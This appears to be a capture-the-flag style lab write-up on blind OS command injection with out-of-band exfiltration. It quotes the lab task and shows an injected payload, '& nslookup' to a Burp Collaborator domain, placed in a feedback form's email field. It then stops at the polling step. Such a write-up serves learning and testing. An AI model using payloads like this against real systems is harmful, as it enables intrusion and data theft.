# Lab 4 - Blind OS command injection with out-of-band data exfiltration

```
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
```
### Solution - 

We first create a external server ie . collaborator server.

![image](https://user-images.githubusercontent.com/67383098/225314001-fc343a73-6fc5-498a-8ea8-bbaab4682c33.png)

Copy the collaborator server link - `http://zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net/`

Paste the payload ` & nslookup zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` (URL - encode ) in the email parameter .

![image](https://user-images.githubusercontent.com/67383098/225314704-8214e8e5-af55-4af7-af05-81e0fcb4c061.png)

Now click SEND button, click `POLL NOW button in `burp collaborator` ,

![image](https://user-images.githubusercontent.com/67383098/225315163-0dcaaa6d-3962-410f-91e4-725784cfdd96.png)

